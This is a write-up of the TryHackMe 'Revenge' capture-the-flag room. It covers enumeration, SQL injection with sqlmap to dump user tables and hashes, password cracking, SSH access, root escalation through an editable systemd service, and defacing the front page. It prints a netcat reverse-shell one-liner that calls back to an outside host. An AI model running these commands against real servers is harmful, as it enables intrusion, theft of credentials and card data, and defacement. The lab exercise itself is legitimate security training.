---
title: TryHackMe - Revenge
layout: post
categories:
- TryHackMe
tag: security,sqlmap, real-world, enumeration
image: "/assets/img/revenge.png"
image_alt: revenge
---

You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?

Created by [Nameless0ne](https://tryhackme.com/p/Nameless0ne) 

<br>

![duck](/assets/img/tryhackme/revenge/duck.jpg)

This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?

There is a sister room to this one. If you have not completed [Blog](https://tryhackme.com/room/blog) yet, I recommend you do so. It's not required but may enhance the story for you.

All images on the webapp, including the navbar brand logo, 404 and 500 pages, and product images goes to [Varg](https://tryhackme.com/p/Varg). Thanks for helping me out with this one, bud.

Please hack responsibly. Do not attack a website or domain that you do not own the rights to. TryHackMe does not condone illegal hacking. This room is just for fun and to tell a story.

<br>

###  Flag 1

`Billy` sends us a note. Let's look at what says to us.

![billy](/assets/img/tryhackme/revenge/billy.png)

He gives us a `mission`. We must `penetrate a server` and `change the front page`. 

Let's `begin`.

First, let's do a `Nmap` scan to gather information about the target.

```
$ nmap -sSCV 10.10.202.34
```

![nmap](/assets/img/tryhackme/revenge/nmap.png)

As you can see `22/tcp and 80/tcp` ports are open.

Let's explore the website.

Here is a `homepage`. 

![home](/assets/img/tryhackme/revenge/home.png)

Let's do a `gobuster` scan. 

```
$ gobuster dir -u http://10.10.202.34/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
```

![gobuster](/assets/img/tryhackme/revenge/gobuster.png)

We found a lot of pages. Let's explore all of them.

__`/contact:`__ Upon examining the page, we don't find anything particularly interesting.

![contact](/assets/img/tryhackme/revenge/contact.png)


__`/product:`__ It looks like there are `four products`. 

![products](/assets/img/tryhackme/revenge/products.png)

Let's examine these products.

![product-1](/assets/img/tryhackme/revenge/product-1.png)

We discover an `endpoint (/product/1)` that could be vulnerable to `SQL injection`.

To confirm this, we modify the endpoint to `/product/2-1` and check if we are `still on the /product/1 page`.

![detect](/assets/img/tryhackme/revenge/detect.png)

Indeed, the page is vulnerable to SQL injection.

Let's do a `sqlmap` scan.

```
$ sqlmap -u http:/10.10.202.34/product/1 --dbs
```

![dbs](/assets/img/tryhackme/revenge/dbs.png)

We found the `duckyinc database`. Let's examine this database.

```
$ sqlmap -u http:/10.10.202.34/product/1 -D duckyinc --tables
```

![tables](/assets/img/tryhackme/revenge/tables.png)

Let's dump `system_user`.

```
$ sqlmap -u http:/10.10.202.34/product/1 -D duckyinc -T system_user --dump
```

![system](/assets/img/tryhackme/revenge/system.png)

We find `three users` and their corresponding `hashes`. 

Let's dump the `user table`.

```
$ sqlmap -u http:/10.10.202.34/product/1 -D duckyinc -T user --dump
```

![user](/assets/img/tryhackme/revenge/user.png)

`Well done!` We find the `first flag` which happens to be `Mandrews' credit card number`.


__`/login:`__

![login](/assets/img/tryhackme/revenge/login.png)

__`/admin:`__

![admin](/assets/img/tryhackme/revenge/admin.png)

<br>

### Flag 2

Now, let's `crack the all hashes`.

![all](/assets/img/tryhackme/revenge/all.png)

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt allhash.hash
```

![john](/assets/img/tryhackme/revenge/john.png)

We find `two passwords`. One for the `server-admin` and another for the `dgorman`.

![result](/assets/img/tryhackme/revenge/result.png)

We try to use these passwords on the `login and admin pages`, but they `don't work`. 

Let's try these on `ssh`.

```
$ ssh server-admin@10.10.202.34
```

![ssh](/assets/img/tryhackme/revenge/ssh.png)

Yes, it is work. We are in the server now.

Let's get the `flag 2`.

![flag-2](/assets/img/tryhackme/revenge/flag-2.png)

<br>

### Flag 3

__`Hint: Mission objectives`__

Now, we need to `escalate our privileges`. We start by running the __`sudo -l`__ command.

![sudo-l](/assets/img/tryhackme/revenge/sudo-l.png)

Which shows that we can `execute duckyinc.service` with root privileges. We examine the contents of this file.

```
$ sudoedit /etc/systemd/system/duckyinc.service
```

![service](/assets/img/tryhackme/revenge/service.png)

We need to change this file.

First, let's create a `shell.sh` and write in this code. (Making Sure to `Change the IP and Port` as Necessary)

```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.86.168 4444 >/tmp/f
```

![shell](/assets/img/tryhackme/revenge/shell.png)

Let's `change the content of the duckyinc.servise` file.

```
User=root
Group=root
ExecStart=/bin/bash /home/server-admin/shell.sh
```

![service-2](/assets/img/tryhackme/revenge/service-2.png)

Now we need it set up a `netcat listener`. Then we can `run` the duckyinc.service.

![get-root](/assets/img/tryhackme/revenge/get-root.png)

Success! We now have `root access`. 

![root](/assets/img/tryhackme/revenge/root.png)

`Remember` the mission. We must `change the front page` for the root flag.

I changed the `index.html` location on the server.

```
$ mv /var/www/duckyinc/templates/index.html
```

Now, we can get the `root flag`.

![root-flag](/assets/img/tryhackme/revenge/root-flag.png)


<br>

`Congratulations!` We have successfully completed the steps to find all the flags. It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:

<br>
